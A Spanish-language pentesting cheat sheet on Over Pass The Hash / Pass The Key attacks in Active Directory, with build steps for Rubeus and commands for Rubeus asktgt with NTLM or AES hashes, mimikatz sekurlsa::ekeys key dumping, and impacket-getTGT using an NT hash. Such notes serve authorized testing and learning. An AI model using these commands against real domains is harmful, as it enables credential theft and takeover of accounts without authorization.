# Over Pass The Hash / Pass The Key

Tags: #AD #OPtH #PtK #Kerberos 

Los hashes que se genera a partir de la contraseña que soporta Kerberos son:
- RC4
- AES128 
- AES256 
El hash que es generado es el mismo que se genera en una autenticación NTLM de una sesión **interactiva**. Por lo tanto se puede hacer lo mismo que en PtH ya que se puede sobrescribir el hash NTLM en la zona de memoria donde va a consultar el paquete de autenticación Kerberos. 

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

# Se necesita un usuario administrador local para obtener el TGT de 'admin' del dominio
❯ .\Rubeus.exe asktgt /domain:domain1 /user:Administrator /rc4:hash_ntlm /ptt 
	# rc4 = Es el hash NTLM obtenido anteriormente  
	# ptt = Pass The Ticket 

❯ .\Rubeus.exe asktgt /domain:domain1 /user:Administrator /aes256:hash_aes256 /ptt 
```

## Mimikatz 

* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

```bash 
Descargar mimikatz 'mimikatz_trunk.zip' desde el enlace de arriba y pasar '/mimikatz_trunk/x64/mimikatz.exe' a la máquina Windows con el usuario comprometido 
```

```powershell 
# Utilizar un usuario 'administrador' local 

❯ .\mimikatz.exe
	❯ sekurlsa::ekeys     # Lista las claves de Kerberos que están en memoria en ese momento


Notas:
	- Mimikatz te muestra de cada usuario la primer clave como la resultante de aplicar la función de hash 'AES256' sobre la password original y las demas claves 'des_cbc_md4' son en realidad claves 'RC4'
```

## Impacket 

```bash 
# Hash NT del usuario 'admin' para obtener el TGT que se guarda en 'administrator.ccache'
❯ impacket-getTGT domain1/administrator -hashes :a87f3a337d73085c45f9516be5787d85  
```